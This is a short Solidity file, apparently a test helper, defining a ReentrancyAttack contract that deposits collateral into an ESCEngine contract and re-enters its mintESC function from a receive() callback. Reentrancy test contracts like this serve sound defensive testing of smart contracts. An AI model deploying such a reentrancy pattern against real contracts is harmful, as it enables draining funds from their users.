// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ESCEngine} from "./../../src/ESCEngine.sol";

contract ReentrancyAttack {
    ESCEngine public engine;
    uint256 amount = 0.1 ether;

    function attack() external payable {
        uint256 collateralAmount = 3 * amount;
        address[] memory tokens = engine.getAllowedTokens();

        engine.depositCollateral(tokens[0], collateralAmount);
        engine.mintESC(amount);
    }

    receive() external payable {
        if (address(engine).balance >= amount) {
            engine.mintESC(amount);
        }
    }
}
